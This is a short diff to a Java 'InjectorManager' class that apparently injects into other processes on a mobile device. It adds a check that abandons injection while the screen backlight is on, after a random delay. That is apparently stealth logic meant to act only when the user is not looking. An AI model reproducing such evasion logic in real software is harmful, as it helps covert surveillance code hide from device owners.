@@ -242,6 +242,13 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
         Utils.sleep(Utils.randomInt(5, 10) * 1000);
 
+        if (status.backlightEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("inject, backlight, bailing out");
+            //#endif
+            return false;
+        }
+        
         if (requestForeground(name)) {
             //#ifdef DEBUG
             debug.trace("inject, executed: " + name);
@@ -430,7 +437,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                     //#ifdef DEBUG
                     debug.trace("requestForeground: bringing foreground");
                     //#endif
-                    manager.requestForeground(processId);
+                    manager.requestForeground(processId);                    
                     return true;
                 }
             }
